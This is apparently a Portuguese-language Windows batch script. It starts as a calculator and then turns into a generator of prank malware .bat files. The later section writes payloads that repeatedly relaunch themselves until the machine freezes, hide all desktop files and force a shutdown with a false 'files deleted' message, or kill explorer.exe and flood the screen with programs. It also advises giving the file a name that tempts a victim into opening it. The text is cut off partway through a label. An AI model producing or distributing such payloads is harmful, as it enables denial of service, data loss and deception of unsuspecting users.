echo      @         @     @   @    @      @      @     @   @     @
echo      @@@@@@@   @     @   @@@@@       @      @@@@@@    @@@@@@@
echo            @   @     @   @    @      @      @     @   @     @
echo            @   @     @   @    @      @      @     @   @     @
echo      @@@@@@@   @@@@@@@   @@@@@@      @      @     @   @     @
echo. 
echo.                               @@  @
echo.                              @  @@
echo.
echo                    @@@@@@@   @@@@@@@   @@@@@@@
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @         @@@@@@@   @     @
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @@@@@@@   @     @   @@@@@@@
echo                      @
echo                     @  @
echo                     @@@
set /p valor1su=**********Digite o primeiro valor**********
set /p valor2su=**********Digite o segundo valor***********
set /a resultadosu=%valor1su%-%valor2su%
echo.
echo      @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@   @         @     @
echo      @     @   @         @         @     @   @         @     @
echo      @     @   @         @         @     @   @         @     @
echo      @@@@@@    @@@@@@@   @@@@@@@   @     @   @         @     @
echo      @     @   @               @   @     @   @         @     @
echo      @     @   @               @   @     @   @         @     @
echo      @     @   @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@
echo. 
echo.                               @@  @
echo.                              @  @@
echo.
echo                    @@@@@@@   @@@@@@@   @@@@@@@
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @         @@@@@@@   @     @
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @@@@@@@   @     @   @@@@@@@
echo                      @
echo                     @  @
echo                     @@@
echo ##############################################################
echo o resultado da subtracao e %resultadosu%
pause
cd %temp%
echo O resultado da subtracao de %valor1su% e %valor2su% e %resultadosu% >> %temp%\historico.txt
:ex22h
cls
echo           @@@@@@@@@@@@@@@@@@@@@@
echo           @ 1 @ nova subtraçao @
echo           @@@@@@@@@@@@@@@@@@@@@@
echo           @ 2 @ inicio         @
echo           @@@@@@@@@@@@@@@@@@@@@@
set opcao=0
set /p opcao=****Digite a opcao--
if %opcao% equ 1 goto ex2h
if %opcao% equ 2 goto plah
goto ex22h
:ex3h
cls
color 1a
echo          @     @   @     @   @         @@@@@@@     @
echo          @@   @@   @     @   @            @        @
echo          @ @ @ @   @     @   @            @        @
echo          @  @  @   @     @   @            @        @
echo          @     @   @     @   @            @        @
echo          @     @   @     @   @            @        @
echo          @     @   @@@@@@@   @@@@@@@      @        @
echo.
echo.
echo       @@@@@@@   @        @   @@@@@@@   @@@@@@@   @@@@@@@
echo       @     @   @        @   @         @     @   @     @
echo       @     @   @        @   @         @     @   @     @
echo       @@@@@@@   @        @   @         @@@@@@@   @@@@@@@
echo       @         @        @   @         @     @   @    @
echo       @         @        @   @         @     @   @     @
echo       @         @@@@@@   @   @@@@@@@   @     @   @     @
echo.
echo.
echo.
set /p valor1mu=**********Digite o primeiro valor**********
set /p valor2mu=**********Digite o segundo valor***********
set /a resultadomu=%valor1mu%*%valor2mu%
echo.
echo      @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@   @         @     @
echo      @     @   @         @         @     @   @         @     @
echo      @     @   @         @         @     @   @         @     @
echo      @@@@@@    @@@@@@@   @@@@@@@   @     @   @         @     @
echo      @     @   @               @   @     @   @         @     @
echo      @     @   @               @   @     @   @         @     @
echo      @     @   @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@
echo. 
echo.                               @@  @
echo.                              @  @@
echo.
echo                    @@@@@@@   @@@@@@@   @@@@@@@
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @         @@@@@@@   @     @
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @@@@@@@   @     @   @@@@@@@
echo                      @
echo                     @  @
echo                     @@@
echo #################################################################
echo o resultado da multiplicacao e %resultadomu%
pause
cd %temp%
echo O resultado da multiplicacao de %valor1mu% por %valor2mu% e %resultadomu% >> %temp%\historico.txt
:ex33h
cls
echo           @@@@@@@@@@@@@@@@@@@@@@@@@@
echo           @ 1 @ nova multiplicasao @
echo           @@@@@@@@@@@@@@@@@@@@@@@@@@
echo           @ 2 @ inicio             @
echo           @@@@@@@@@@@@@@@@@@@@@@@@@@
set opcao=0
set /p opcao=****Digite a opcao--
if %opcao% equ 1 goto ex3h
if %opcao% equ 2 goto plah
goto ex33h
:ex4h
cls
color 8b
echo.
echo.
echo.                                                 @@  @
echo.                                                @  @@
echo.     
echo      @@@@@@@    @  @          @   @  @@@@@@@   @@@@@@@   @@@@@@@
echo      @      @   @   @        @    @  @         @     @   @     @
echo      @      @   @    @      @     @  @         @     @   @     @
echo      @      @   @     @    @      @  @@@@@@@   @@@@@@@   @     @
echo      @      @   @      @  @       @        @   @     @   @     @
echo      @      @   @       @@        @        @   @     @   @     @
echo      @@@@@@@    @                 @  @@@@@@@   @     @   @@@@@@@
echo.
echo.
echo.
echo.
echo.
set /p valor1di=**********Digite o primeiro valor**********
set /p valor2di=**********Digite o segundo valor***********
set /a resultadodi=%valor1di% / %valor2di%
echo.
echo      @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@   @         @     @
echo      @     @   @         @         @     @   @         @     @
echo      @     @   @         @         @     @   @         @     @
echo      @@@@@@    @@@@@@@   @@@@@@@   @     @   @         @     @
echo      @     @   @               @   @     @   @         @     @
echo      @     @   @               @   @     @   @         @     @
echo      @     @   @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@
echo. 
echo.                               @@  @
echo.                              @  @@
echo.
echo                    @@@@@@@   @@@@@@@   @@@@@@@
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @         @@@@@@@   @     @
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @@@@@@@   @     @   @@@@@@@
echo                      @
echo                     @  @
echo                     @@@
echo ##############################################################
echo o resultado da divisao e %resultadodi%
pause
cd %temp%
echo O resultado da divisao de %valor1di% por %valor2di% e %resultadodi% >> %temp%\historico.txt
:ex44h
cls
echo           @@@@@@@@@@@@@@@@@@@@
echo           @ 1 @ nova divisao @
echo           @@@@@@@@@@@@@@@@@@@@
echo           @ 2 @ inicio       @
echo           @@@@@@@@@@@@@@@@@@@@
set opcao=0
set /p opcao=****Digite a opcao--
if %opcao% equ 1 goto ex4h
if %opcao% equ 2 goto plah
goto ex44h
:hih
cls
color 3e
echo.
echo.
echo.
echo.
echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
echo @@@@@@@ @@@@@ @@@@@ @@@@@       @@@       @@@       @@@       @@@ @@@@@ @@@@@@
echo @@@@@@@ @@@@@ @@@@@ @@@@@ @@@@@@@@@@@@ @@@@@@ @@@@@ @@@ @@@@@ @@@@ @@@ @@@@@@@
echo @@@@@@@ @@@@@ @@@@@ @@@@@ @@@@@@@@@@@@ @@@@@@ @@@@@ @@@ @@@@@ @@@@@ @ @@@@@@@@
echo @@@@@@@       @@@@@ @@@@@       @@@@@@ @@@@@@ @@@@@ @@@      @@@@@@@ @@@@@@@@@
echo @@@@@@@ @@@@@ @@@@@ @@@@@@@@@@@ @@@@@@ @@@@@@ @@@@@ @@@ @@@@@ @@@@@ @@@@@@@@@@
echo @@@@@@@ @@@@@ @@@@@ @@@@@@@@@@@ @@@@@@ @@@@@@ @@@@@ @@@ @@@@@ @@@@ @@@@@@@@@@@
echo @@@@@@@ @@@@@ @@@@@ @@@@@       @@@@@@ @@@@@@       @@@ @@@@@ @@@ @@@@@@@@@@@@
echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
echo.
echo.    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
echo     @ 1 @ Limpar Historico         @
echo     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
echo     @ 2 @ Apagar Historico         @
echo     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
echo     @ 3 @ Abrir Historico          @
echo     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
echo     @ 4 @ Abrir local do historico @
echo     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
echo     @ 5 @ Voltar                   @
echo     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
echo.
echo.
set opcao=0
set /p opcao=****Digite a opcao--
if %opcao% equ 1 goto his1
if %opcao% equ 2 goto his2
if %opcao% equ 3 goto his3
if %opcao% equ 5 goto plah
if %opcao% equ 4 goto his4
goto hih
:his1
cd %temp%
echo Histórico da calculadora dia %date%, hora %time% > %temp%\historico.txt
cls
echo.
echo.
echo.
echo o historico foi limpo com sucesso!!!
echo.
echo.
echo.
pause
goto hih
:his2
cd %temp%
del %temp%\historico.txt
cls
echo.
echo.
echo.
echo O historico foi deletado com sucesso!!!
echo.
echo.
echo.
pause
goto hih
:his3
cd %temp%
start %temp%\historico.txt
cls
echo.
echo.
echo.
echo.
echo Abrindo historico.....
echo.
echo.
echo.
echo.
pause
goto hih
:his4
start %temp%
cls
echo.
echo  Abrindo o local do historico...
echo.
pause
goto hih
:com6
if not exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUA6.gc goto notpodiss
if exist %userprofile%\arquivos_temporarios_do_gerador\lix.agc goto com6b
cd desktop
if exist lixx.agc goto com6b
:erro
cls
echo ################################################################
echo #                                      ecesso negado           #
echo #            @@@              #     #                          #
echo #           @   @              #   #  O conteudo a seguir esta #
echo #          @     @              # #   disponivel somente para  #
echo #          @     @               #    a vercao ATIVADA do      #
echo #         @@@@@@@@@             # #   produto, e nao para o    #
echo #         @@@   @@@            #   #  ATIVADA PARCIALMENTE     #
echo #         @@@ @ @@@           #     #                          #
echo #         @@@   @@@                                            #
echo #         @@@@@@@@@                                            #
echo #                                                              #
echo ################################################################
pause
goto com
:com6b
cls
echo             @@@
echo            @   @
echo           @     @
echo           @     @
echo                 @                   #
echo          @@@@@@@@@                 #
echo          @@@   @@@            #   #
echo          @@@ @ @@@             # #
echo          @@@   @@@              #
echo          @@@@@@@@@
echo.                  
pause
:com6bb
cls
echo #########################################################
echo # 1---Bat que trava o computador........................#
echo # 2---ocultar arquivos do usuario.......................#
echo # 3---Entupidor de tela.................................#
echo # 4---Loop..............................................#
echo # 5---voltar............................................#
echo #########################################################
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto com61
if %opcao% equ 2 goto com62
if %opcao% equ 3 goto com63
if %opcao% equ 4 goto com64
if %opcao% equ 5 goto com
goto com6bb
:com61
cls
echo #########################################################
echo # 1---somente "piscar" janelas..........................#
echo # 2---Travar MESMO - impocivel de parar.................#
echo # 3---voltar............................................#
echo #########################################################
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto com611
if %opcao% equ 2 goto com612
if %opcao% equ 3 goto com6bb
goto com61
:com611
cls
echo Este .bat NAO danifica o computador.
echo somente fica trocando janelas, pode ser parado fazendo logof...
set /p nome=***digite o nome para salva-lo(sem extensao)---
echo @echo off >> %nome%.bat
echo echo                     7508057                  >> %nome%.bat
echo echo                 749477777772527              >> %nome%.bat
echo echo              7882             184            >> %nome%.bat
echo echo             88                  787          >> %nome%.bat
echo echo            87                     82         >> %nome%.bat
echo echo           8                        87        >> %nome%.bat
echo echo          42  7                     78        >> %nome%.bat
echo echo          8  07                    0 8        >> %nome%.bat
echo echo          8  87                   24 8        >> %nome%.bat
echo echo          42 49                   8  8        >> %nome%.bat
echo echo           8 74  5085       7727  8 57        >> %nome%.bat
echo echo           707  8888887   7888887 857       DESTRUICAO TOTAL>> %nome%.bat
echo echo            58 78800887   8800088 28          >> %nome%.bat
echo echo     28     97  888882 7  7888882 78    2087  >> %nome%.bat
echo echo    82 807  42   7447 1887  8887  20  701 58  >> %nome%.bat
echo echo   80    75218       78888       78277    78  >> %nome%.bat
echo echo   798807    78017   488887    788    7252 58 >> %nome%.bat
echo echo        75847   888          7827  7557   722 >> %nome%.bat
echo echo            758 72742     77178 2477          >> %nome%.bat
echo echo              7 717 575 7 77777 0             >> %nome%.bat
echo echo              79 707572 277722  8             >> %nome%.bat
echo echo           74170   7078787827  40057          >> %nome%.bat
echo echo     8885417   587    777    788   28844587   >> %nome%.bat
echo echo    78     74917 287       782 7542      87   >> %nome%.bat
echo echo     87  082       700525882      708   87    >> %nome%.bat
echo echo      8787                           754      >> %nome%.bat
echo start %nome%.bat >> %nome%.bat
echo exit >> %nome%.bat
cls
echo O .bat foi salvo no diretorio DESTE gerador!!
echo em alguns casos ele é salvo na area de trabalho.
echo.
echo ATENCAO!!!!!!!!!!!!!!!
echo  de FORMA ALGUMA renomeie o virus....
echo  caso seja renomeado, para de funcionar!!!
pause
goto com61
:com612
cls
echo Este .bat NAO danifica o computador.
echo somente trava o computador, forcando o desligamento direto...
set /p nome=***digite o nome para salva-lo(sem extensao)---
echo start %nome%.bat >> %nome%.bat
echo start %nome%.bat >> %nome%.bat
echo exit >> %nome%.bat
cls
echo O .bat foi salvo no diretorio DESTE gerador!!
echo em alguns casos ele é salvo na area de trabalho.
echo.
echo ATENCAO!!!!!!!!!!!!!!!
echo  de FORMA ALGUMA renomeie o virus....
echo  caso seja renomeado, para de funcionar!!!
pause
goto com61
:com62
cls
echo este virus NAO danifica os arquivos e o computador!!
echo.
echo #########################################################
echo # 1---Gerar virus.......................................#
echo # 2---Gerar Antidoto....................................#
echo # 3---voltar............................................#
echo #########################################################
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto com621
if %opcao% equ 2 goto com622
if %opcao% equ 3 goto com6bb
goto com62
:com621
set /p nome=***digite o nome como o virus sera salvo(sem extensao)---
cd desktop
echo @echo off >> %nome%.bat
echo cd desktop >> %nome%.bat
echo color 3b  >> %nome%.bat
echo echo @B@B@B@B@@@B@B@B@B@B@B@B@B@B@B@B@@@B@B@B@B@@@ >> %nome%.bat
echo echo B@B@B@B@B@B@B@B@MBBBi..LB@M@B@B@B@B@@@@@B@B@B >> %nome%.bat
echo echo @B@B@B@B@@@B@B@MBM@     ,@BMBB@B@B@B@B@@@B@@@ >> %nome%.bat
echo echo B@@@@@B@B@B@B@BBM@G      @MBB@B@B@@@B@B@B@B@B >> %nome%.bat
echo echo @B@B@B@B@B@B@B@BMMO      BMM@B@@@B@B@B@B@B@B@ >> %nome%.bat
echo echo @@@@B@@@@@B@MO@@MMG      @OBBBO@B@B@B@B@B@B@B >> %nome%.bat
echo echo @B@B@B@B@BJ    :MM8      BM8.   ,5@B@B@B@B@@@ >> %nome%.bat
echo echo B@B@MBB@r       uB0      BM:       uB@MBB@B@B >> %nome%.bat
echo echo @B@MBB1         OMG      BMk         8@BBB@B@ >> %nome%.bat
echo echo BBM@B;       iq@OMG      @GBB5.       U@MBB@B >> %nome%.bat
echo echo @MBB:      :MB@MOMO      BMOB@@q       J@MBB@ >> %nome%.bat
echo echo BBBr      U@BBMBOBG      @OMMBM@B;      P@MBB >> %nome%.bat
echo echo BB0      F@MBBBMMMO      @MOBMBM@Br      BBMB >> %nome%.bat
echo echo M@.     r@MBMBBBMBO      @MMM@BBMBB.     JBMM >> %nome%.bat
echo echo @M      @BBM@B@BMBO      @MM@BBBBM@F     .@MM Carregando >> %nome%.bat
echo echo BN     .@MMBB@BBMBG      @OBM@B@BMMB      BMM alguns arquivos...  >> %nome%.bat
echo echo @X     ,@MMMBB@MBMO      BMM@B@BBMBB      BMM >> %nome%.bat
echo echo BO      BBMBB@BBMB@Y    N@MBB@B@MMBG      @MM >> %nome%.bat
echo echo @B      XBMMBB@@@B@B@OMB@B@B@B@MBM@i     :@MM >> %nome%.bat
echo echo M@L      @@MM@@@B@@@B@B@B@B@B@BBM@0      ZBBM >> %nome%.bat
echo echo BM@      .@BBMBB@B@B@@@B@B@B@BBM@E      iBMM@ >> %nome%.bat
echo echo MBBM       EB@B@B@B@B@@@B@B@B@B@J      .B@M@B >> %nome%.bat
echo echo @MMB8       :E@B@B@B@B@B@B@@@Bk.      .B@MBB@ >> %nome%.bat
echo echo B@MMBB.        vq@@@B@B@B@MPi        rB@M@B@B >> %nome%.bat
echo echo @B@MBB@L           .::i:.           PB@B@B@B@ >> %nome%.bat
echo echo B@B@B@@@Bv                       .1@B@B@B@B@B >> %nome%.bat
echo echo @B@B@B@B@B@ki                  7O@@@@B@B@B@B@ >> %nome%.bat
echo echo B@B@B@B@@@B@B@O1r:       .:LkBB@B@B@B@B@B@@@B >> %nome%.bat
echo echo @B@B@B@B@B@B@B@B@B@B@@@B@B@B@@@B@B@B@B@B@B@@@ >> %nome%.bat
echo attrib +h +s /s /d *.* >> %nome%.bat
echo shutdown -s -f -t 10 -c " seus arquivos foram excluidos!!! seu computador sera desligado em 10 segundos... " >> %nome%.bat
cls
echo  o virus foi salvo como %nome%.bat no diretorio DESTE gerador...
echo   OBS: em alguns casos ele e salvo na area de trabalho...
echo.
echo  OBS: para que o virus cumpra sua funcao, e necessario que 
echo       ele esteja na area de trabalho!!! e a vitima precisa abri-lo!!!
echo.
echo       De um nome a ele que deiche a vitima com curiosidade o clique nele!!!
pause
goto com62
:com622
cls
set /p nome=***digite o nome como o virus sera salvo(sem extensao)---
echo @echo off >> %nome%.bat
echo cd desktop >> %nome%.batt
echo echo Estamos resturando seus arquivos... >> %nome%.bat
echo attrib -h -s /s /d *.* >> %nome%.bat
echo cls >> %nome%.bat
echo echo Os arquivos foram restaurados... >> %nome%.bat
echo pause >> %nome%.bat
cls
echo o antidoto foi salvo no diretorio DESTE gerador com o nome de antidoto.bat...
echo OBS: em alguns casos ele e salvo na area de trabalho...
echo.
echo.
echo   ATENCAO!!!   para que o antidoto funcione... e necessario
echo   que ele seja colocado no MESMO diretorio onde o virus foi
echo   aberto!!!
pause
goto com62
:com63
cls
echo  Para saber o que cada um deles faz, basta digitar o seu numero...
echo.
echo #########################################################
echo # 1---intupidor de tela completo........................#
echo # 2---somente abrir programas...........................#
echo # 3---voltar............................................#
echo #########################################################
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto com631
if %opcao% equ 2 goto com632
if %opcao% equ 3 goto com6bb
goto com621
:com631
cls
echo  este "entupidor de tela" cria 48 arquivos vasios no seu diretorio e 
echo  abre varios programas, como o paint e o bloco de notas..
echo  também encerra o explorer.exe.
echo. NAO danifica o computador.
echo.
echo #########################################################
echo # 1--- salvar em um .bat................................#
echo # 2---Cancelar..........................................#
echo #########################################################
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto com6311
if %opcao% equ 2 goto com63
goto com631
:com6311
cls
set /p nome=***digite o neme como deseja chamar o bat(sem extensao)---
echo cd Desktop >> %nome%.bat
echo copy NUL teste1.txt >> %nome%.bat
echo copy NUL teste2.txt >> %nome%.bat
echo copy NUL teste.txt >> %nome%.bat
echo copy NUL teste23.txt >> %nome%.bat
echo copy NUL test74e.txt >> %nome%.bat
echo copy NUL teste.txt >> %nome%.bat
echo copy NUL tes72te.txt >> %nome%.bat
echo copy NUL tes72te.txt >> %nome%.bat
echo copy NUL test72e.txt >> %nome%.bat
echo copy NUL tes7te.txt >> %nome%.bat
echo copy NUL te72ste.txt >> %nome%.bat
echo copy NUL tesadrgte.txt >> %nome%.bat
echo copy NUL tesdfgte.txt >> %nome%.bat
echo copy NUL tesfukte.txt >> %nome%.bat
echo copy NUL tesargte.txt >> %nome%.bat
echo copy NUL tescghte.txt >> %nome%.bat
echo copy NUL tesdhnte.txt >> %nome%.bat
echo copy NUL tesndte.txt >> %nome%.bat
echo copy NUL texfgnste.txt >> %nome%.bat
echo copy NUL tetrxdste.txt >> %nome%.bat
echo copy NUL tytxereste.txt >> %nome%.bat
echo copy NUL tesyersxte.txt >> %nome%.bat
echo copy NUL terseste.txt >> %nome%.bat
echo copy NUL teyreszste.txt >> %nome%.bat
echo copy NUL testyrezse.txt >> %nome%.bat
echo copy NUL testrye.txt >> %nome%.bat
echo copy NUL testrze.txt >> %nome%.bat
echo copy NUL testqe.txt >> %nome%.bat
echo copy NUL testwe.txt >> %nome%.bat
echo copy NUL testwee.txt >> %nome%.bat
echo copy NUL testee.txt >> %nome%.bat
echo copy NUL tester.txt >> %nome%.bat
echo copy NUL tester.txt >> %nome%.bat
echo copy NUL testef.txt >> %nome%.bat
echo copy NUL testeg.txt >> %nome%.bat
echo copy NUL testegh.txt >> %nome%.bat
echo copy NUL testet6.txt >> %nome%.bat
echo copy NUL tesshtte.txt >> %nome%.bat
echo copy NUL tessrtte.txt >> %nome%.bat
echo copy NUL teshte.txt >> %nome%.bat
echo copy NUL tessrthte.txt >> %nome%.bat
echo copy NUL tesrtste.txt >> %nome%.bat
echo copy NUL tesrthste.txt >> %nome%.bat
echo copy NUL tessrtte.txt >> %nome%.bat
echo copy NUL tesrtste.txt >> %nome%.bat
echo copy NUL tesrtste.txt >> %nome%.bat
echo copy NUL tesrtste.txt >> %nome%.bat
echo copy NUL tetrthste.txt >> %nome%.bat
echo copy NUL trheste.txt >> %nome%.bat
echo copy NUL tesrtste.txt >> %nome%.bat
echo copy NUL trthseste.txt >> %nome%.bat
echo copy NUL tesrthste.txt >> %nome%.bat
echo copy NUL terthsste.txt >> %nome%.bat
echo copy NUL thrtsheste.txt >> %nome%.bat
echo copy NUL testsrhe.txt >> %nome%.bat
echo copy NUL tesrthste.txt >> %nome%.bat
echo copy NUL teshsrtte.txt >> %nome%.bat
echo copy NUL tesrthsste.txt >> %nome%.bat
echo copy NUL tesrthstrhte.txt >> %nome%.bat
echo copy NUL teshsrtste.txt >> %nome%.bat
echo copy NUL tesrthsthste.txt >> %nome%.bat
echo copy NUL tstheste.txt >> %nome%.bat
echo copy NUL tstheste.txt >> %nome%.bat
echo copy NUL testsste.txt >> %nome%.bat
echo copy NUL tehssrthste.txt >> %nome%.bat
echo copy NUL tesrthste.txt >> %nome%.bat
echo copy NUL tsrtheste.txt >> %nome%.bat
echo copy NUL tesrhste.txt >> %nome%.bat
echo copy NUL tessthte.txt >> %nome%.bat
echo copy NUL tesrthste.txt >> %nome%.bat
echo copy NUL tehsrthste.txt >> %nome%.bat
echo copy NUL tetrhsste.txt >> %nome%.bat
echo copy NUL terthsste.txt >> %nome%.bat
echo copy NUL tessthte.txt >> %nome%.bat
echo Copy NUL redtfuyh.mp3 >> %nome%.bat
echo Copy NUL dcfgbjh.mp3 >> %nome%.bat
echo Copy NUL yuiop.doc >> %nome%.bat
echo Copy NUL ertyuiop.exe >> %nome%.bat
echo Copy NUL troxa.avi >> %nome%.bat
echo Copy NUL ertyuiop.avi >> %nome%.bat
echo Copy NUL xdfcgvbnm.exe >> %nome%.bat
echo Copy NUL ertyuioopp.bat >> %nome%.bat
echo Copy NUL eu.jpg >> %nome%.bat
echo Copy NUL dfgvbnm34568.jar >> %nome%.bat
echo Copy NUL erdtfbuyhji.txt >> %nome%.bat
echo copy NUL terthste.txt >> %nome%.bat
echo copy NUL tessrthte.txt >> %nome%.bat
echo copy NUL tessrthte.txt >> %nome%.bat
echo copy NUL tesrthste.txt >> %nome%.bat
echo copy NUL tsheste.txt >> %nome%.bat
echo copy NUL tsrtheste.txt >> %nome%.bat
echo copy NUL tesrthste.txt >> %nome%.bat
echo copy NUL tesrthhste.txt >> %nome%.bat
echo copy NUL te57iytte.txt >> %nome%.bat
echo copy NUL t46teste.txt >> %nome%.bat
echo copy NUL t5e7ieste.txt >> %nome%.bat
echo copy NUL tes78te.txt >> %nome%.bat
echo copy NUL te57ityjhste.txt >> %nome%.bat
echo copy NUL tesw57ukyte.txt >> %nome%.bat
echo copy NUL tese56i7tu6ste.txt >> %nome%.bat
echo copy NUL tet6y7ste.txt >> %nome%.bat
echo copy NUL teokste.txt >> %nome%.bat
echo copy NUL teu46j6ytste.txt >> %nome%.bat
echo copy NUL tes54urtjte.txt >> %nome%.bat
echo copy NUL tet6s4rjste.txt >> %nome%.bat
echo copy NUL ts6ryeste.txt >> %nome%.bat
echo copy NUL tes35te4shrte.txt >> %nome%.bat
echo cd C:\Windows\System32 >> %nome%.bat
echo start mspaint.exe >> %nome%.bat
echo start SnippingTOOL.exe >> %nome%.bat
echo start SndVol.exe >> %nome%.bat
echo start SoundRecorder.exe >> %nome%.bat
echo start StikyNot.exe >> %nome%.bat
echo start tabcal.exe >> %nome%.bat
echo start taskschd.msc >> %nome%.bat
echo start Utilman.exe >> %nome%.bat
echo start calc.exe >> %nome%.bat
echo start cmd.exe >> %nome%.bat
echo start colorcpl.exe >> %nome%.bat
echo taskkill /f /im explorer.exe >> %nome%.bat
cls
echo o .bat foi salvo no deretorio DESTE gerador como %nome%.bat!!!
echo OBS: em alguns casos ele e salvo na area de trabalho...
pause
goto com63
:com632
cls
echo  este "entupidor de tela" abre varios programas e fecha o explorer.exe
echo  NAO danifica o computador...
echo.
echo #########################################################
echo #   1---criar .bat......................................#
echo #   2---cancelar........................................#
echo #########################################################
set opcao=0
se /p opcao=***digite sua opcao---
if %opcao% equ 1 goto com6321
if %opcao% equ 2 goto com63
goto com632
:com6321
cls
set /p nome=***digite o nome como deseja chamar o .bat(sem extensao)
echo cd C:\Windows\System32 >> %nome%.bat
echo start mspaint.exe >> %nome%.bat
echo start SnippingTOOL.exe >> %nome%.bat
echo start SndVol.exe >> %nome%.bat
echo start SoundRecorder.exe >> %nome%.bat
echo start StikyNot.exe >> %nome%.bat
echo start tabcal.exe >> %nome%.bat
echo start taskschd.msc >> %nome%.bat
echo start Utilman.exe >> %nome%.bat
echo start calc.exe >> %nome%.bat
echo start cmd.exe >> %nome%.bat
echo start colorcpl.exe >> %nome%.bat
echo taskkill /f /im explorer.exe >> %nome%.bat
cls
echo o .bat foi salvo no diretorio DESTE gerador com o nome de %nome%...
echo OBS: em alguns casos ele e salvo na area de trabalho...
pause
goto com63
:com64
cls
echo.
echo   o loop, abre muitos programas e fica se repetindo infinitamente,
echo   ate que o computador trave...
echo   nao e possivel parar depois de iniciado
echo   NAO danifica o computador
echo   tranca o computador, obrigando o desligamento forçado,
echo   podera haver perda de dados que ainda nao foram salvos...
echo.
echo #########################################################
echo #  1---gerar .bat.......................................#
echo #  2---cancelar.........................................#
echo #########################################################
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto com641
if %opcao% equ 2 goto com6bb
goto com64
:com641
cls
set /p nome=***digite o nome que deseja dar ao .bat(sem extensao)---
cd desktop
echo :ini >> %nome%.bat
echo cd desktop >> %nome%.bat
echo start tre.bat >> %nome%.bat
echo start mspaint.exe >> %nome%.bat
echo start calc.exe >> %nome%.bat
echo start cmd.exe >> %nome%.bat
echo cd desktop >> %nome%.bat
echo goto ini >> %nome%.bat
cls
echo o lupi foi salvo no diretorio DESTE gerador...
echo OBS: em alguns casos ele e salvo na area de trabalho...
pause
goto com6
:com7
if not exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUA7.gc goto notpodiss
cls
echo.
echo   OBS: Para utilizar este comando énecessario desativat o anti-virus!!
echo #########################################################
echo #  1---bloquear cites...................................#
echo #  2---Limpar bloqueios.................................#
echo #  3---voltar...........................................#
echo #########################################################
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto com71
if %opcao% equ 2 goto com72
if %opcao% equ 3 goto com
goto com7
:com71
cls
echo    *digite o cite que deseja bloquear
echo    *digite 1 para concluir
echo.
set /p site=***digite o site que deseja bloquear---
if %site% equ 1 goto com7
ECHO 127.0.0.1  %site% >> %WINDIR%\system32\drivers\etc\hosts
cls
echo o site "%site%" foi bloqueado com sudesso!!!
pause
goto com71
:com72
cls
echo # Copyright (c) 1993-2009 Microsoft Corp. > %WINDIR%\system32\drivers\etc\hosts
echo # >> %WINDIR%\system32\drivers\etc\hosts
echo # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. >> %WINDIR%\system32\drivers\etc\hosts
echo # >> %WINDIR%\system32\drivers\etc\hosts
echo # This file contains the mappings of IP addresses to host names. Each >> %WINDIR%\system32\drivers\etc\hosts
echo # entry should be kept on an individual line. The IP address should >> %WINDIR%\system32\drivers\etc\hosts
echo # be placed in the first column followed by the corresponding host name. >> %WINDIR%\system32\drivers\etc\hosts
echo # The IP address and the host name should be separated by at least one >> %WINDIR%\system32\drivers\etc\hosts
echo # space. >> %WINDIR%\system32\drivers\etc\hosts
echo # >> %WINDIR%\system32\drivers\etc\hosts
echo # Additionally, comments (such as these) may be inserted on individual >> %WINDIR%\system32\drivers\etc\hosts
echo # lines or following the machine name denoted by a '#' symbol. >> %WINDIR%\system32\drivers\etc\hosts
echo # >> %WINDIR%\system32\drivers\etc\hosts
echo # For example: >> %WINDIR%\system32\drivers\etc\hosts
echo # >> %WINDIR%\system32\drivers\etc\hosts
echo #      102.54.94.97     rhino.acme.com          # source server >> %WINDIR%\system32\drivers\etc\hosts
echo #       38.25.63.10     x.acme.com              # x client host >> %WINDIR%\system32\drivers\etc\hosts
echo. >> %WINDIR%\system32\drivers\etc\hosts
echo # localhost name resolution is handled within DNS itself. >> %WINDIR%\system32\drivers\etc\hosts
echo #	127.0.0.1       localhost >> %WINDIR%\system32\drivers\etc\hosts
echo #	::1             localhost >> %WINDIR%\system32\drivers\etc\hosts
cls
echo O registro foi restaurado...
pause
goto com7
:com8
if not exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUA8.gc goto notpodiss
cls
echo #########################################################
echo # 1---Criar repeticao...................................#
echo # 2---Criar Loop........................................#
echo # 3---Voltar............................................#
echo #########################################################
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto com81
if %opcao% equ 2 goto com82
if %opcao% equ 3 goto com
goto com8
:com81
if not exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep1\comtemp.txt goto replit1
